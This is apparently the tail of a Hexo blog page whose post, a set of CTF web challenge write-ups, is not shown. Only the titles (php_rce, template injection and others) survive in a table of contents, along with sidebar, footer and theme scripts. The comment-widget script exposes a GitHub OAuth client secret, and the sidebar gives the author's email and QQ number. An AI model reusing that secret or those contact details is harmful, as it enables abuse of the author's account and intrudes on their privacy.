title="CUMTCTF-2021秋季赛部分题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ctf_coding-1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-07</div><div class="title">CUMTCTF-2021秋季赛部分题解</div></div></a></div><div><a href="/posts/2f9013ea/" title="Java语言及网络编程作业"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/java.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-20</div><div class="title">Java语言及网络编程作业</div></div></a></div><div><a href="/posts/6ced4cb0/" title="LFSRXOR题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5f3f3d10b054e.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-07</div><div class="title">LFSRXOR题解</div></div></a></div><div><a href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Feature-Image-Python-Frameworks-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">Python实现动态验证码(包含GUI)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://avatars.githubusercontent.com/u/75996100?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Capcomin</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/capcomin"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/capcomin" target="_blank" title="Github"><i class="fab fa-github-alt"></i></a><a class="social-icon" href="mailto:zxy6538@cumt.edu.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1172201743" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#robots"><span class="toc-number">1.</span> <span class="toc-text">robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Training-WWW-Robots"><span class="toc-number">2.</span> <span class="toc-text">Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-rce"><span class="toc-number">3.</span> <span class="toc-text">php_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-python-template-injection"><span class="toc-number">4.</span> <span class="toc-text">Web_python_template_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-07-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A5-10%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">ics-07 （难度：5&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wtf-sh-150-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A7-10%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">wtf.sh-150 （难度：7&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zhuanxv-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A7-10%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">Zhuanxv （难度：7&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blgdel-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A8-10%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">blgdel （难度：8&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filemanager-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A8-10%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">filemanager （难度：8&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-04-%EF%BC%88%E9%9A%BE%E5%BA%A64-10%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">ics-04 （难度4&#x2F;10）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bug-%EF%BC%88%E9%9A%BE%E5%BA%A6%EF%BC%9A5-10%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">bug （难度：5&#x2F;10）</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/4a17b156/" title="Hello World"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/star.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/posts/4a17b156/" title="Hello World">Hello World</a><time datetime="2022-01-19T11:36:00.000Z" title="发表于 2022-01-19 19:36:00">2022-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16b653c4/" title="攻防世界Web题目WP（二）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cyberlock.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界Web题目WP（二）"/></a><div class="content"><a class="title" href="/posts/16b653c4/" title="攻防世界Web题目WP（二）">攻防世界Web题目WP（二）</a><time datetime="2022-01-02T16:00:00.000Z" title="发表于 2022-01-03 00:00:00">2022-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7b9d3851/" title="Rabin加密体制原理概述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rabincover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Rabin加密体制原理概述"/></a><div class="content"><a class="title" href="/posts/7b9d3851/" title="Rabin加密体制原理概述">Rabin加密体制原理概述</a><time datetime="2021-12-29T09:25:01.000Z" title="发表于 2021-12-29 17:25:01">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/Feature-Image-Python-Frameworks-1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python实现动态验证码(包含GUI)"/></a><div class="content"><a class="title" href="/posts/8aab642a/" title="Python实现动态验证码(包含GUI)">Python实现动态验证码(包含GUI)</a><time datetime="2021-12-07T16:00:00.000Z" title="发表于 2021-12-08 00:00:00">2021-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6ced4cb0/" title="LFSRXOR题解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5f3f3d10b054e.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LFSRXOR题解"/></a><div class="content"><a class="title" href="/posts/6ced4cb0/" title="LFSRXOR题解">LFSRXOR题解</a><time datetime="2021-12-07T08:06:49.000Z" title="发表于 2021-12-07 16:06:49">2021-12-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Capcomin</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">鲁ICP备2022007660号-1</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '646e2aef05bc21960fdf',
      clientSecret: '71e7a181764ffcc984eca414e002e005f7b323dc',
      repo: 'comments',
      owner: 'CAPCOMIN',
      admin: ['CAPCOMIN'],
      id: 'd4fab78c0a6bb49287d5a8788e9b7566',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>